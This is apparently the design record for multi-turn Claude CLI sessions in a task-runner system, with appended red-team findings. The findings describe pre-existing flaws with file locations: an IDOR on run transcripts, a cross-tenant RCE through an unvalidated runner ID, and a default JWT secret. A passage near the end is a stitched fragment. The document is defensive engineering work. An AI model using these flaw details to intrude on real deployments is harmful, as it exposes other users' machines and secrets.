> Multi-agent design (red-team hardened). Status: **implemented** and shipped to `main` — kept here as the design record.

# Route B — Red-Team-Hardened Design: Interactive Multi-Turn Claude Sessions

## 0. One-paragraph summary

An interactive conversation is a **single long-lived `TaskRun`** holding **one long-lived `claude` process** kept alive across turns via `--input-format stream-json` on stdin. Add **one new server→runner channel**: a per-run HTTP long-poll `GET /api/runner/runs/:id/inbox`, modeled on the in-prod `GET /api/runner/jobs` claim poll (verified `LONG_POLL_MS=25_000`, `QueueService.claimForRunner`/`waitForSignal`). User turns are durably queued in a new `ConversationTurn` table; the assistant/tool transcript stays in `RunEvent`. The output path (`POST /runner/runs/:id/events` → hub → SSE) is reused. **No WebSocket** (the gateway forces `Connection ''`, stripping Upgrade — verified `gateway/nginx.conf:36`). The interactive path is gated on a single `ClaimedJob.interactive` flag so the one-shot pipeline is byte-for-byte unchanged.

The red-team review surfaced **12 critical + 24 high/medium findings** that change this from "lean and shippable" to "needs specific correctness machinery before any user touches it." The biggest structural changes folded in below: **(a)** delivery is at-least-once with idempotent consumption (turns are *not* acked on dequeue); **(b)** a real `@Interval` server-side reaper (none exists today) drives liveness off the heartbeat, not off the inbox; **(c)** `cancel()`/`/end` must match `AWAITING_INPUT`, not just `RUNNING`; **(d)** recovery keys on the server-generated `sessionUuid`, never the late/nullable scraped `claudeSessionId`; **(e)** seq high-water mark is persisted server-side so it survives respawn; **(f)** the IDOR on `GET /runs/:id` + the unvalidated `assignedRunnerId` cross-tenant RCE are pre-existing critical bugs that this feature *amplifies* and must be fixed first; **(g)** stdin writes and event POSTs move off the stdout-reader goroutine to avoid pipe-backpressure deadlock; **(h)** turns are strictly serialized per turn boundary; **(i)** a client-supplied `clientTurnId` threads end-to-end for idempotency + bubble reconciliation.

Two findings are deliberately accepted as **residual risk** for v1 (documented in §9): the single-process hub/inbox/cancel signal limits the feature to **one apiserver replica** until LISTEN/NOTIFY lands; and the "permission-mode clamp to the Agent ceiling" is **not a real ceiling** because the user owns the Agent — so v1 restricts interactive Bash-capable modes behind a per-runner opt-in instead of relying on the clamp.

## 1. Transport

### Decisions
- **Server → runner (input/interrupt/end):** new per-run long-poll `GET /api/runner/runs/:id/inbox` (≤25 s hold, `EventEmitter` wakeup keyed by runId, mirroring `QueueService`). Returns the next deliverable `ConversationTurn` or `204`.
- **Runner → browser (output):** **unchanged** — `POST /runner/runs/:id/events` → `RealtimeService.publish` → `@Sse GET /runs/:id/events`.
- **Browser → server:** small authenticated `POST`s (`/tasks/:id/turns|interrupt|end`).

### Why long-poll, not WebSocket
The runner is outbound-only HTTP (`transport.go`). The gateway proves the 25 s long-poll + SSE in prod; a WS handshake **fails today** because `gateway/nginx.conf:36` forces `Connection ''`. WS would need a new nginx location, `@nestjs/platform-ws`, a Go WS client, and depends on the external TLS terminator allowing `Upgrade`. Long-poll gives sub-second turn delivery with zero gateway change.

### Latency, and the missed-wakeup fix (RT: concurrency-medium)
`EventEmitter.emit` is fire-and-forget; a notify landing in the runner's re-arm gap is lost. **Correctness never depends on the wakeup** — the durable `ConversationTurn` row is the source of truth. To hit latency: the inbox handler **always checks for deliverable turns immediately on entry (before parking)** and re-checks after each wakeup; the inner wait slice is short (≤5 s, mirroring `waitForSignal`'s `Math.min(remaining,5000)`), so a missed signal costs ≤5 s, not 25 s. Token output stays on the existing path; interactive spawns with `--include-partial-messages` and the runner flush cadence drops 1 s→250 ms **in the interactive branch only**.

### Gateway compatibility
No nginx edit. The inbox poll reuses `location /api/` (`proxy_buffering off`, `read_timeout 3600s`). Turns are delivered as the long-poll **response body**, so `proxy_request_buffering` is irrelevant.

## 2. Delivery semantics — at-least-once + idempotent (RT: failure/concurrency critical ×2)

The original design acked a turn on dequeue (`PENDING→DELIVERED`), which **permanently loses** any turn whose runner connection drops between the server flip and the stdin write, or whose wakeup is lost on apiserver restart. Replaced with a lease model:

- **Dequeue does NOT terminally ack.** The inbox dequeue sets `status='IN_FLIGHT'`, `deliveredAt=now()`, `leaseDeadlineAt=now()+LEASE_MS` (e.g. 60 s) in the **same transaction** that selects the row (`FOR UPDATE SKIP LOCKED`).
- **The deliverable query is** `status='PENDING' OR (status='IN_FLIGHT' AND leaseDeadlineAt < now())` — so an undelivered/un-acked turn is **re-served** after the lease expires.
- **Ack happens on confirmed consumption:** the runner flips `IN_FLIGHT→ANSWERED` via `POST /turn-complete{turnId}` (for messages) or the runner emits the canonical `user` `RunEvent` carrying `clientTurnId` (durable proof of consumption). `interrupt`/`end` turns are acked when the runner applies them.
- **Idempotent consumption on the runner:** dedup by `turnId` — a re-served turn already written to stdin is not re-fed.
- **Startup sweep:** on apiserver boot and on every reaper tick, `IN_FLIGHT` turns past lease are reset to `PENDING`.

Residual risk: a turn re-served after lease expiry while the runner *did* consume it but the ack was lost → the runner's `turnId` dedup drops the duplicate, so at-least-once collapses to exactly-once on the happy path; the only visible artifact is one re-served inbox round-trip.

## 3. Turn serialization & priority (RT: concurrency high ×3, hang-backpressure high)

- **Messages are strictly serialized per turn boundary.** `POST /tasks/:id/turns` is **rejected with 409** when the run is `RUNNING` (a turn is mid-flight), accepted only in `AWAITING_INPUT`. This removes the "feed a second user message into a busy process" undefined-behavior window (claude's mid-turn stdin semantics are unverified — Phase 0 gate).
  - Residual UX: a user who wants to queue-while-running gets a 409 + "a turn is in progress." If queue-while-running is later desired, the runner must gate the next pull on observing its own `result`/`AWAITING_INPUT` transition.
- **`interrupt` and `end` are a priority lane.** The inbox dequeue returns `kind IN ('interrupt','end')` **before** any `message`, so Stop preempts queued sends. Interrupt is processed even while `RUNNING`.
- **Interrupt while `AWAITING_INPUT` is a no-op** (nothing to interrupt) — rejected server-side rather than leaking into the next turn.
- **Per-run pending cap:** `/turns` rejects with 429 if pending+in-flight message turns exceed `K` (e.g. 1, since we serialize) — backpressure against rapid sends / key-repeat.
- **Idempotency key:** `RunTurnRequest.clientTurnId` (client UUID); `@@unique([runId, clientTurnId])` makes a double-click / cross-tab duplicate a no-op returning the existing turn.

## 4. seq ownership & monotonicity across respawn (RT: failure/scaling high ×2)

Two independent seq spaces remain:
1. **`RunEvent.seq`** — runner-owned, monotonic for the whole session.
2. **`ConversationTurn.seq`** — server-assigned, delivery-ordering only, allocated atomically (§5.4).

**The fix the original missed:** the session-scoped runner counter resets to 0 on respawn/reclaim, and `createMany({skipDuplicates:true})` (verified `runner-api.controller.ts:239`) would **silently drop** the colliding post-respawn events. So:
- The runner **persists nothing** about seq; instead, on (re)spawn/reclaim it initializes its counter from the **server-returned high-water mark**: `reclaim` and the `inbox`/spawn handshake return `maxSeq = MAX(RunEvent.seq) for the run` (ignoring the `MAX_SAFE_INTEGER` terminal sentinel), and the Session starts at `maxSeq+1`.
- The server detects a seq regression on ingest (an incoming `seq <= maxSeq` for a live run with no matching row) and logs it rather than relying on `skipDuplicates` to hide corruption.

### 5.3 New model `ConversationTurn`
```prisma
model ConversationTurn {
  id             String    @id @default(uuid())
  runId          String
  run            TaskRun   @relation(fields: [runId], references: [id], onDelete: Cascade)
  seq            Int       // server-assigned, atomic, delivery ordering only
  clientTurnId   String?   // client idempotency key
  kind           String    @default("message") // message | interrupt | end
  role           String    @default("user")
  content        String    @default("")
  permissionMode String?   // per-turn override (enum-validated server-side)
  model          String?   // per-turn override (allowlist-validated server-side)
  status         String    @default("PENDING") // PENDING | IN_FLIGHT | ANSWERED | CANCELLED
  leaseDeadlineAt DateTime?
  createdAt      DateTime  @default(now())
  deliveredAt    DateTime?
  answeredAt     DateTime?

  @@unique([runId, seq])
  @@unique([runId, clientTurnId])     // idempotency
  @@index([runId, status, seq])       // priority-ordered dequeue
}
```

### 5.4 Atomic seq allocation (RT: concurrency/data-consistency high ×2)
`seq = max(seq)+1` is a non-atomic read-modify-write that races under READ COMMITTED → either P2002 or misordering. Allocate inside a transaction that locks the parent `TaskRun` (`SELECT ... FOR UPDATE` on the run row) or use a per-run Postgres sequence. On P2002, retry. The dequeue is:
```sql
UPDATE "ConversationTurn" SET status='IN_FLIGHT', "deliveredAt"=now(), "leaseDeadlineAt"=now()+interval '60 seconds'
WHERE id = (
  SELECT id FROM "ConversationTurn"
  WHERE "runId"=$1 AND (status='PENDING' OR (status='IN_FLIGHT' AND "leaseDeadlineAt"<now()))
  ORDER BY (CASE WHEN kind IN ('interrupt','end') THEN 0 ELSE 1 END), seq ASC
  FOR UPDATE SKIP LOCKED LIMIT 1
) RETURNING *;
```

## 6. Process lifecycle (runner / Go)

### Spawn-once
On a job with `interactive==true`, create a `Session` and spawn:
```
claude -p --input-format stream-json --output-format stream-json --verbose \
  --include-partial-messages --replay-user-messages \
  --session-id <job.SessionUuid> --model M --permission-mode PM [tools/mcp] \
  [--resume <job.SessionUuid>]   # on respawn/reclaim only; key on sessionUuid, NOT scraped id
```
- **No prompt argv** — every turn arrives over stdin.
- **Session-scoped context** (`context.WithCancel(context.Background())`), not per-turn (today `claude.go:64` binds to the per-run ctx).
- **`--session-id <SessionUuid>`** is the single recovery key (RT: failure high — the scraped `session_id` is late/nullable; keying `--resume` on it loses the pre-turn-1-crash window). The scraped `session_id` is persisted only as observability.

### Goroutine architecture (RT: hang-backpressure critical ×2)
Three goroutines, decoupled:
1. **stdout reader** — only parses + enqueues to a **bounded channel** (cap N events / M bytes). Never calls HTTP. On overflow: drop `text_delta` first, keep `tool_use`/`tool_result`/`turn_end`, emit a `{droppedDeltas:K}` marker. This stops the synchronous-flush deadlock where a slow POST stalls draining claude's 64 KB stdout pipe.
2. **sender** — drains the channel, batches (25 events / 250 ms), POSTs with **retry+backoff that does NOT discard the batch on failure** (re-queue; idempotent via `(runId,seq)` + `skipDuplicates`). Bind the POST context to the session context so cancel aborts in-flight POSTs (today `transport.do` derives from `context.Background()` — must thread session ctx).
3. **stdin writer** — owns a channel; **all** stdin writes (user message, EOF) go through it, never inline under a lock shared with interrupt. Each write has a timeout (write-in-goroutine + select-on-timer, since `os.Pipe` has no `SetWriteDeadline`); on timeout → treat session wedged → SIGKILL + respawn-with-resume, and **do not ack** the turn (leave for redelivery).

### Interrupt = signal, not stdin (RT: hang-backpressure critical)
Interrupt uses **process SIGINT** (the design's stated fallback becomes the default), so it cannot be blocked by a stuck stdin write. Mid-turn steer via `control_request{subtype:'interrupt'}` is best-effort behind a Phase-0-verified capability flag; SIGINT+`--resume <sessionUuid>` is the shipped behavior. On interrupt, emit an `interrupt` `RunEvent` **with a real seq at the point generation actually stops**, so the transcript delimits abandoned output.

### Per-turn `result` = end-of-turn, not terminal
`msg["type"]=="result"` → emit `turn_end{turnSeq,subtype,usage}`, POST `/turn-complete`, set run `AWAITING_INPUT`, park. The process dies only on EOF / idle reap / crash / cancel / **per-turn timeout**. If `result.subtype` indicates the process hit its own `--max-turns`/`--max-budget-usd`, the runner marks the **session terminal** (not `AWAITING_INPUT`) and `/complete`s, because those limits are process-wide for a long-lived process (RT: hang high).

### Deadlines & reaping (RT: hang-backpressure critical ×2, failure critical)
- **Per-turn wall-clock deadline** (e.g. 5–10 min from stdin-feed to `result`): on expiry emit `turn_end{subtype:'timeout'}`, then escalate **EOF → SIGINT → SIGKILL**, each with a grace timer. This covers the active-but-stuck turn the idle reaper misses.
- **Runner idle reap** (default 10 min, resets on inbox items): close stdin → if `cmd.Wait()` doesn't return within grace (10 s) → SIGKILL → `/complete SUCCEEDED`.
- **Scanner overflow** (`bufio` 16 MB token cap, verified `claude.go:86`): check `sc.Err()` after the loop (today ignored, `claude.go:87-100`); on `bufio.ErrTooLong` emit an explicit error + truncated marker, do **not** treat as a crash (avoids deterministic respawn-loop on a large `tool_result`). Cap respawn-on-resume so identical-output crashes can't burn N resumes.

### Crash & restart recovery
- **Process crash:** respawn `--resume <sessionUuid>` up to N (default 2), emit `system{subtype:'resumed'}`, init Session counter from server `maxSeq+1`. After N → `/complete FAILED`.
- **Runner restart:** on startup call `GET /api/runner/runs/reclaim` (strictly `runnerId == self`), respawn each returned run with `--resume <sessionUuid>`, re-init seq from `maxSeq`, **re-populate the `active`/`sessions` map BEFORE re-entering the claim loop** (RT: scaling high — otherwise it over-claims past `MaxConcurrent`).
- **Single live session per runId on the runner:** a `runId → *Session` map; reclaim/respawn atomically replaces, never runs two (RT: scaling medium).

### Concurrency / shutdown
`active map[string]context.CancelFunc` → `sessions map[string]*Session`; the session-scoped cancel is registered so heartbeat `cancelRunIds` tears down a **parked** session too (RT: failure critical — today only a per-turn cancel exists). Drain closes stdin on all sessions and waits.

## 8. Server-side reaper (NEW @Interval — RT: failure/scaling critical ×3)

No background job exists today (verified: zero `@Cron`/`@Interval`/`setInterval`). Add `@nestjs/schedule` + one `@Interval` reaper that runs **independently of the inbox** (injecting an `end` turn can't reap a *dead* runner):
1. **Heartbeat liveness:** any `RUNNING`/`AWAITING_INPUT` run whose `runner.lastHeartbeatAt` is older than `OFFLINE_AFTER_MS` (90 s, verified constant) → set run `INTERRUPTED`, task `FAILED`, **publish terminal STATUS on the hub** (SSE closes cleanly + UI exits streaming), mark `PENDING/IN_FLIGHT` turns `CANCELLED`.
2. **Idle deadline:** `idleDeadlineAt < now()` → directly transition the run terminal server-side **and** `requestCancel` (not via inbox `end` alone).
3. **Lease sweep:** reset expired `IN_FLIGHT` turns to `PENDING`.
4. **Leader election:** wrap each tick in `pg_try_advisory_lock` so only one replica reaps; the grace window is set safely longer than worst-case partition+buffer-replay so a healthy-but-partitioned runner isn't falsely failed (RT: failure medium partition). Make `end` injection idempotent.

`POST /tasks/:id/turns` rejects (409) when the owning runner is stale by the same 90 s window instead of queuing into a dead inbox.

## 9. Security / permissions

- **Pre-existing critical bugs this feature amplifies — fix FIRST (Milestone 0):**
  - **IDOR:** `RunsController.get`/`events` have no owner scoping (verified `runs.controller.ts:17,32`). Any authed user can read any transcript (live shell output, secrets). Add owner assertion + regression test.
  - **Cross-tenant RCE:** `CreateTaskDto.assignedRunnerId` is unvalidated (verified `dto.ts:19`) and `tryClaim`'s `assignedRunnerId` branch has no owner cross-check (verified `queue.service.ts:59`). Validate `assignedRunnerId` is owned in `TasksService.create`/`update`; add `AND t."ownerId" = (SELECT "ownerId" FROM "Runner" WHERE id=$1)` to the claim. Interactive turns make this a persistent interactive-shell primitive on a victim machine.
- **Channel auth:** inbox/reclaim/turn-complete reuse `RunnerAuthGuard` + `assertOwnership` (run.runnerId == runner.id). reclaim filters strictly by `runnerId` (no looser predicate).
- **Input-injection:** user text only ever in the JSON `content` field, marshaled by Go `encoding/json`. Per-turn `permissionMode`/`model` are **enum/allowlist validated server-side before insert** and the runner **never** passes a server-supplied string to argv without an allowlist (RT: authz high). `request_id` for control frames is generated runner-side, never from user input.
- **Permission ceiling — residual risk (RT: authz high):** "clamp to the Agent ceiling" is **not** a real ceiling because the user owns the Agent and `bypassPermissions` passes `@IsIn` validation (verified `enums.ts:46`). v1 therefore: introduces a **per-Runner operator-set `maxPermissionMode`** enforced in `buildJob`, and **refuses to spawn interactive sessions in `bypass`/`dontAsk` Bash-capable modes on runners that have not opted in** (RT: authz medium — no `canUseTool` round-trip in v1). The true `canUseTool` approval round-trip is deferred; documented as a known gap that gates non-plan modes on shared runners.
- **JWT / SSE token (RT: authz high):** secret falls back to `'dev-secret'` (verified `auth.module.ts:14`) and access tokens are 7 d (verified `:15`), passed in the SSE URL (logged by nginx). v1 hardening: **fail apiserver startup if `JWT_SECRET` is unset**, and mint a short-TTL single-use SSE ticket bound to `{userId,runId}` for `?ticket=`; add `access_log off` (or query-stripping log_format) on `location /api/`. (Shortening the primary JWT TTL + refresh is follow-up.)
- **Runner token (RT: authz medium):** add rotation/expiry + revoke; never log inbox bodies (composer input may contain pasted secrets).
- **DoS/quota (RT: authz medium):** per-owner cap on concurrent interactive sessions; absolute (non-resettable-by-turns) session wall-clock TTL; count interactive slots so they can't starve one-shot capacity.

## 10. Coexistence with the one-shot queue

1. **Claim:** interactive Task is a normal `QUEUED` task via the same `FOR UPDATE SKIP LOCKED` path; `buildJob` only adds `interactive`/`sessionUuid`/`maxSeqHint`/`resumeSessionId`.
2. **Runner fork:** at the top of `executeAndReport` (`runloop.go:108`) branch on `job.Interactive`: false → existing `executeJob` verbatim; true → Session loop. seq/flush machinery lifts to Session scope only in the interactive branch.
3. **`result`/complete (highest-risk):** one-shot keeps `result`→terminal + `complete()` STATUS{final}. Interactive: `result`→turn boundary; `/complete` only on teardown; gate every divergence on `interactive` and test that one-shot is byte-for-byte unchanged.
4. **`cancel()`/`complete()` mapping:** `cancel()` must match `AWAITING_INPUT` (verified it only matches `RUNNING`, `tasks.service.ts:113`, and only enters the branch when `task.status===RUNNING`, `:111`). `complete()`'s task-status mapping has no path that flips an interactive parked run terminal on a turn boundary (verified `:299-308`); guard that interactive never calls `/complete` on a turn.
5. **Concurrency:** interactive sessions must not starve the single one-shot slot (default `MaxConcurrent=1`). v1: require `MaxConcurrent > 1` for interactive-enabled runners and document it; ideally count a parked session separately (follow-up). Server-authoritative count prevents over-subscription.
6. **Output/SSE:** identical path; one-shot `TaskDetailPage` keeps working; `AgentView` gets the multi-turn variant; all new fields optional.

## 11. Frontend (`src/web`)

- **Subscribe to `Task.activeRunId`, not `runs[0]`** (RT: data-consistency high + low). `TaskDetailPage` resets `events`/`seen` on `latestRun.id` change (verified `:29-30`) — for interactive, reset **only when `runId` changes (session switch)**, never on turn boundaries; never on neither.
- **Stable id reconciliation (RT: data-consistency high + low):** thread `clientTurnId` through `/turns` → `ConversationTurn` → inbox → runner `user` `RunEvent` payload. Dedup user bubbles by `clientTurnId`, not content (so "yes"/"retry"/"continue" repeats work). The runner emits the `user` `RunEvent` **the moment it pulls the turn from the inbox** (it has text+turnId+next seq), so durability does **not** depend on `--replay-user-messages` echoing (RT: data-consistency high — echo unverified).
- **Wire Send/Stop/End:** Send button currently has no `onClick` (verified `AgentView:126`). First send → `POST /tasks {interactive:true,...}`; subsequent → `/turns`. While `RUNNING` (between a `user` event and its `turn_end`) Send → **Stop** (`/interrupt`); separate **End session** → `/end`. Disable Send on click; re-enable on response.
- **Authoritative state over SSE:** every tab derives composer state from broadcast `RunStatus` transitions + `runner.online` (15 s `['runners']` poll already exists), so tabs converge. `runner.online===false` mid-turn → surface a **turn failure**, not just a disabled composer (RT: data-consistency high).
- **Mode mapping:** `'Plan'/'Accept Edits'/'Default'` → `PermissionMode`. Disable Model selector once a session is live (mid-session swap out of scope).
- **Reconnect:** replace `onerror=()=>es.close()` with jittered backoff (RT: scaling high — synchronized reconnect storm). Use `?sinceSeq=`/Last-Event-ID so reconnect replays only `seq > last` (RT: scaling/data-consistency medium — full-history replay storm on long sessions).
- **Real sessions list:** replace hardcoded `SESSIONS`; route `/agents/:id/sessions/:runId`.

## 12. Residual risks accepted for v1
1. **Single apiserver replica only** (RT: scaling critical ×3). Hub, inbox signal, and cancel hint are in-process (verified `realtime.service.ts:8` comment; nginx has no affinity, `gateway/nginx.conf:27-28` DNS round-robin). v1 ships with a **startup `pg_advisory_lock` guard that refuses to serve interactive endpoints if a second apiserver holds the lock**, rather than relying on operator discipline. LISTEN/NOTIFY for hub+inbox+cancel is a hard blocker before multi-replica.
2. **No `canUseTool` approval round-trip** — mitigated by per-runner opt-in + tool allowlist excluding Bash/Write/Edit by default for non-opted runners.
3. **Mid-turn `control_request` steer is best-effort** — SIGINT+`--resume` is the shipped path.
4. **Connection budget** at the gateway (long-poll + per-tab SSE, `read_timeout 3600s`) is documented with explicit `worker_connections`/ulimit sizing; multi-tab SSE collapse (SharedWorker) is follow-up.

Any authenticated user reads any run's full transcript including live shell output and secrets. Interactive amplifies (richer, long-lived).** — Load run->task, assert task.ownerId===req.user.userId (403 otherwise) in both handlers; gate live$ subscription on ownership. Regression test user B->user A run = 403. Ship in Milestone 0 before any interactive code.
- **[critical] Cross-tenant RCE via unvalidated assignedRunnerId (dto.ts:19) + tryClaim has no owner cross-check (queue.service.ts:59). Ship in Milestone 0.

# Appendix A — Key Decisions

- **Server→runner transport for user input/interrupt → Per-run HTTP long-poll GET /api/runner/runs/:id/inbox (25s hold, EventEmitter wakeup), a clone of the existing /runner/jobs claim poll. Reject WebSocket.** — The runner is outbound-only HTTP behind NAT and the gateway already proves the 25s long-poll + SSE in prod with zero changes (verified location /api/ has proxy_buffering off, read_timeout 3600s). A WS handshake FAILS today because gateway/nginx.conf forces Connection '' (strips Upgrade); WS would need a new nginx location, @nestjs/platform-ws, a Go WS client, and depends on the unverifiable external TLS terminator allowing Upgrade. The EventEmitter wakeup gives sub-50ms delivery, satisfying near-real-time without that blast radius. This is the judge-consensus highest-fit/lowest-attack-surface spine (Proposal 1).
- **Process model → One long-lived claude process per interactive TaskRun, spawned with --input-format stream-json --output-format stream-json --include-partial-messages --replay-user-messages --session-id <serverUuid>, bound to a SESSION-scoped context, fed one user-message JSONL line per turn on stdin.** — Keeps full conversation context in one process (true Route B) instead of re-spawning per turn. Verified claude.go today binds exec to a per-run ctx and treats result as terminal (claude.go:64,97-99); both must change. --session-id pins the resume key BEFORE turn 1 (grafted from Proposals 2/3), strictly better than scraping it from the init event. --replay-user-messages lets the runner emit the canonical user RunEvent with a real session seq, preserving the dedup-by-seq contract.
- **result semantics → Treat the per-turn `result` message as END-OF-TURN (emit turn_end event + POST /turn-complete + park in AWAITING_INPUT), not process-terminal. Only call /complete on stdin EOF / idle reap / crash / cancel.** — The existing one-shot path treats result as terminal and complete() emits STATUS{final:true} with seq=MAX_SAFE_INTEGER (runner-api.controller.ts:310-315), which the browser reads as 'done'. For a multi-turn session that terminal event must be deferred to true teardown or the UI hangs/closes wrong. This is the single highest-risk coexistence change; gating it on the interactive flag keeps one-shot byte-for-byte unchanged.
- **Data model shape → Additive Shape A: a long-lived TaskRun IS the session; new ConversationTurn table holds the durable user-input queue; RunEvent stays the single transcript. Add RunStatus.AWAITING_INPUT, RunEventType USER/TURN_END/INTERRUPT, Task.interactive/sessionUuid, TaskRun.interactive/lastTurnAt/idleDeadlineAt. Reject a separate Conversation/Session table.** — Lowest blast radius — reuses the entire Task/TaskRun/RunEvent/queue/SSE machinery with optional/additive fields, so the one-shot pipeline and TaskDetailPage are unaffected. A durable Postgres turn queue (vs the in-memory cancel Map) survives apiserver restart and runner-poll races and gives ordering/backpressure for rapid sends and concurrent tabs. Shape B (new Session table) is a large migration that rewires the queue for no near-term benefit.
- **Seq ownership → Two independent seq spaces: RunEvent.seq stays runner-owned and monotonic for the WHOLE session (counter hoisted to Session scope); ConversationTurn.seq is server-assigned for delivery ordering only and is never written into RunEvent. User turns enter the transcript as runner-emitted RunEvent{type:'user'} with the next runner seq.** — The SSE client dedups by a single monotonic seq Set and the DB has @@unique([runId,seq]) (verified schema.prisma:214, TaskDetailPage:34). Keeping one seq authority (the runner) across all turns avoids any coordination protocol and keeps both contracts intact. The --replay-user-messages echo supplies the canonical user text for that event.
- **Crash/restart recovery → Graft Proposal 3's hardening: GET /runner/runs/reclaim so a restarted runner re-attaches RUNNING/AWAITING_INPUT runs and respawns with --resume; auto-resume up to N times on process crash with a visible system{resumed} marker; persist claudeSessionId on the first system/init event; server-side idle reaper (idleDeadlineAt) that injects an 'end' for wedged runners.** — This is what made Proposal 3 the robustness winner and what Proposal 1 lacked (it orphans runs on runner restart). buildJob never sets resumeSessionId today (verified queue.service.ts:95-112) so there is currently NO recovery path despite the --resume wiring existing (claude.go:54-56). The server-side reaper is defense-in-depth so a session can't leak a process + MaxConcurrent slot if the runner's own timer fails.
- **Security / permissions → Reuse RunnerAuthGuard+assertOwnership for runner endpoints and JwtAuthGuard+ownerId scoping for browser endpoints; rely on Go json.Marshal as the stdin injection boundary; bound turn content at 10MB; CLAMP per-turn permissionMode/model overrides to the owning Agent's policy ceiling; run v1 in non-blocking permission modes (defer canUseTool round-trip).** — Adds the smallest new auth surface (the inbox is a normal authenticated GET reusing verified guards). The clamp (grafted from Proposal 3) is the strongest single security idea across all proposals: even a compromised browser session cannot escalate a turn to bypassPermissions on the runner machine. Non-blocking modes avoid a hung turn because interactive permission prompts have no return path in v1 (default agent mode is already dontAsk, schema.prisma:121).
- **Scale-out posture → Treat moving the in-memory hub + inbox EventEmitter + cancel Map to Postgres LISTEN/NOTIFY as an HA PREREQUISITE before any multi-replica deploy, not a deferred optimization. Single-replica for v1.** — RealtimeService is single-process in-memory (verified realtime.service.ts:8 comment). With >1 replica the browser turn POST may hit a replica not holding the runner's inbox poll and SSE may be on a third — the feature silently breaks. The durable ConversationTurn queue already makes the data HA-safe; only the wakeup signal needs LISTEN/NOTIFY. All three judges flagged this as the shared robustness ceiling.
- **Token-streaming latency tuning → Spawn with --include-partial-messages and drop the runner event flush cadence from 1s to 250ms in the interactive branch only (runloop.go flush ticker).** — Grafted concrete tuning from Proposal 1. The existing flush is 25 events or 1s (verified runloop.go:130,139) which feels laggy for live token streaming; 250ms makes deltas feel real-time while keeping batch efficiency. # Appendix B — Red-team findings

- **[critical] (failure-recovery)** DELIVERED is a terminal-ish state with no redelivery path. The design marks a turn DELIVERED at dequeue time (before the runner has durably consumed it onto stdin), so any failure between 'server flipped to DELIVERED' and 'runner wrote to claude stdin and emitted the user RunEvent' permanently loses that turn. This is the classic at-most-once vs at-least-once delivery bug. The in-memory wakeup loss on restart is the trigger, but the root cause is acking on dequeue instead of on confirmed consumption.
  - scenario: Server restart loses the in-memory inbox EventEmitter mid-turn while a turn is PENDING/DELIVERED. Concrete sequence: (1) browser POSTs /tasks/:id/turns -> ConversationTurn(status=PENDING) inserted, realtime.notifyInbox(runId) fires. (2) The runner's inbox long-poll is parked on a DIFFERENT moment, or the turn was already flipped to DELIVERED by a held poll that hadn't yet written to stdin. (3) apiserver restarts (deploy, OOM, crash). On restart RealtimeService is reconstructed empty (realtime.service.ts:11-13) - the inbox waiter Map, cancel Map and hub Subject are all gone. The runner's inbox HTTP request dies with the connection; the runner re-arms a new GET /inbox. The server now serves PENDING turns again - good for PENDING - but a turn already flipped to DELIVERED (design says inbox 'atomically flips to DELIVERED') will NEVER be re-served because the inbox query filters status='PENDING' (design 3.3 @@index([runId,status]), 4 'Returns next PENDING ConversationTurn'). The runner that was about to write that DELIVERED turn to stdin lost it on connection death. Result: a user message is silently dropped - the user sees their bubble, the assistant never responds, the session sits in AWAITING_INPUT forever.
  - fix: Make inbox delivery at-least-once with idempotent consumption. (a) Do NOT mark DELIVERED at dequeue; keep the turn PENDING (or use a short lease: set deliveredAt + a visibility deadline, and re-serve PENDING-or-(DELIVERED-with-expired-lease)). (b) The runner acks a turn only via turn-complete OR via the runner emitting the canonical user RunEvent; turn-complete carries turnId and flips PENDING/DELIVERED -> ANSWERED. (c) Make consumption idempotent on the runner: dedup by turnId so a re-served turn that was actually written to stdin is not double-fed. (d) On apiserver startup, run a sweep that resets any DELIVERED-but-unanswered turns past their lease back to PENDING so the next inbox poll re-serves them.
- **[critical] (failure-recovery)** The server-side reaper as designed (inject 'end' into the inbox) is unsound for a dead runner: the inbox is drained by the runner, so a reaper action that depends on the runner consuming it cannot reap a runner that is gone. There is also no liveness signal tying a session's aliveness to the runner heartbeat. Combined with no existing background job, dead-runner sessions leak runs, pin MaxConcurrent on respawn, and accept silently-dropped turns.
  - scenario: No orphan-run reaper means a runner that dies mid-session leaks the run forever in AWAITING_INPUT/RUNNING. Concrete: a user has an interactive session, run is AWAITING_INPUT, claude process alive on the runner. The runner host loses power / is killed -9 / loses network permanently. There is NO background reaper in the apiserver (verified: runners.service.ts:31-34 computes 'online' lazily at read-time only; grep shows zero @Cron/@Interval/setInterval). The TaskRun stays AWAITING_INPUT and Task stays RUNNING indefinitely. The browser SSE stays open (history replayed, live hub silent) showing a 'live' session that is actually dead. The user types a new turn -> POST /turns inserts a ConversationTurn and returns 200 (the design only 'rejects if no RUNNING/AWAITING_INPUT run' - it IS AWAITING_INPUT) -> notifyInbox fires into the void -> no runner is polling -> the turn sits PENDING forever, no error surfaced. The design's server-side idle reaper (3.2 idleDeadlineAt, 2 'injects an end inbox item') ALSO does nothing here: injecting an 'end' turn just appends another PENDING ConversationTurn that no runner will ever drain; it never transitions the run to a terminal state.
  - fix: Add a real server-side reaper (a NestJS @Interval, since none exists today) that does two things independently of the inbox: (1) Heartbeat-based: any TaskRun in RUNNING/AWAITING_INPUT whose runner.lastHeartbeatAt is older than OFFLINE_AFTER_MS (90s) is force-failed: set run FAILED (or a new INTERRUPTED state), task FAILED, emit terminal STATUS{final:true} on the hub so the SSE closes the session cleanly, and mark any PENDING turns CANCELLED. (2) Idle-deadline-based teardown must directly transition the run to terminal server-side (not via inbox 'end') when idleDeadlineAt passes AND optionally request cancel. POST /turns must reject (409) when the owning runner is offline by the same 90s window, instead of silently queuing into a dead inbox.
- **[critical] (failure-recovery)** The 'universal cancel fallback' the whole recovery story leans on (interrupt/end fall back to requestCancel per design 4 'POST /end ... falls back to requestCancel') silently no-ops for AWAITING_INPUT runs because cancel only looks at status='RUNNING'. The end/cancel paths therefore cannot tear down an idle interactive session, defeating the coarse kill-switch.
  - scenario: The existing cancel path cannot cancel an interactive session because it queries status='RUNNING'. Concrete: interactive run is parked in AWAITING_INPUT (the design's normal idle state). User clicks Cancel -> TasksService.cancel (tasks.service.ts:109-122) does findFirst({where:{taskId:id, status:'RUNNING'}}). An AWAITING_INPUT run does NOT match, so run is null, requestCancel is never called, but the task is still flipped to CANCELLED (tasks.service.ts:118-121). The runner is never told. Its claude process and inbox poll keep running. The session is now a zombie: Task=CANCELLED in DB but a live claude process + a live inbox long-poll on the runner, holding a MaxConcurrent slot forever. Worse, the design names cancel as the 'universal fallback' kill-switch for interactive (design 4, 6.5, 10) - but that fallback is broken for the exact state interactive sessions spend most of their time in.
